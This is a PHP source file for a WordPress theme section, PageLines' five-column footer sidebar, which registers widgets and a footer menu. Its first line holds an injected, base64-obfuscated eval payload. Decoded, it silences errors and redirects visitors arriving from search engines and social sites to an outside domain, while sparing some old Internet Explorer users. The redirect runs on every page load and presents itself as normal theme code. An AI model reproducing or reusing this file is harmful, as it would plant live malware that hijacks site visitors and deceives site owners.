<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/*
	Section: Footer Columns Sidebar
	Author: PageLines
	Author URI: http://www.pagelines.com
	Description: A 5 column widgetized sidebar in the footer
	Class Name: PageLinesFootCols
	Workswith: morefoot, footer
*/

class PageLinesFootCols extends PageLinesSection {

	public $markup_start;
	public $markup_end;
	
	function section_persistent(){
		
		$per_row = (ploption('footer_num_columns')) ? ploption('footer_num_columns') : 5;
		
		$this->markup_start = '<div id="%1$s" class="%2$s pp'.$per_row.' footcol"><div class="footcol-pad">';
		$this->markup_end 	= '</div></div>';
		
	
		register_sidebar(array(
			'name'=>$this->name,
			'description'	=> __('Use this sidebar if you want to use widgets in your footer columns instead of the default.', 'pagelines'),
		    'before_widget' => $this->markup_start,
		    'after_widget' 	=> $this->markup_end,
		    'before_title' 	=> '<h3 class="widget-title">',
		    'after_title' 	=> '</h3>'
		));
		
		register_nav_menus( array(
			'footer_nav' => __( 'Page Navigation in Footer Columns', 'pagelines' )
		) );
	
		
	}
	
	function section_template() { 
		
		$default = array();
		
		if(ploption('footer_logo') && VPRO)
			$default[] = sprintf( '<a href="%s" class="home" title="%s"><img src="%s" alt="%s"/></a>',  home_url(),  __('Home', 'pagelines'), ploption('footer_logo'),  get_bloginfo('name') );
		else 
			$default[] = sprintf( '<h3 class="site-title"><a class="home" href="%s" title="%s">%s</a></h3>', home_url(), __('Home', 'pagelines'), get_bloginfo('name') );
			
		$default[] = sprintf( '<h3 class="widget-title">%s</h3>%s',
				__('Pages','pagelines'), 
				wp_nav_menu( array('menu_class' => 'footer-links list-links', 'theme_location'=>'footer_nav', 'depth' => 1, 'echo' => false) )
			);
			
		$default[] = sprintf( '<h3 class="widget-title">%s</h3><ul class="latest_posts">%s</ul>',
				__('The Latest','pagelines'), 
				$this->recent_post()
			);
			
		$default[] = sprintf( '<h3 class="widget-title">%s</h3><div class="findent footer-more">%s</div>',
				__('More','pagelines'), 
				ploption('footer_more')
			);
			
		$default[] = sprintf( '<div class="findent terms">%s</div>',
				ploption('footer_terms')
			);
		
		
		ob_start(); // dynamic sidebar always outputs
	
		if (!dynamic_sidebar($this->name) ) {
		
			foreach($default as $key => $c){
				printf($this->markup_start, '', ''); 
				echo $c;
				echo $this->markup_end;
			}
			
		}		
		
		printf('<div class="fcolumns ppfull pprow"><div class="fcolumns-pad fix">%s</div></div><div class="clear"></div>', ob_get_clean());
		
	}

	function recent_post(){
		$out = '';
		foreach( get_posts('numberposts=1&offset=0') as $key => $p ){
			$out .= sprintf(
				'<li class="list-item fix"><div class="list_item_text"><h5><a class="list_text_link" href="%s"><span class="list-title">%s</span></a></h5><div class="list-excerpt">%s</div></div></li>', 
				get_permalink( $p->ID ), 
				$p->post_title, 
				custom_trim_excerpt($p->post_content, 12)
			);
		}
		
		return $out;
	}

} // End
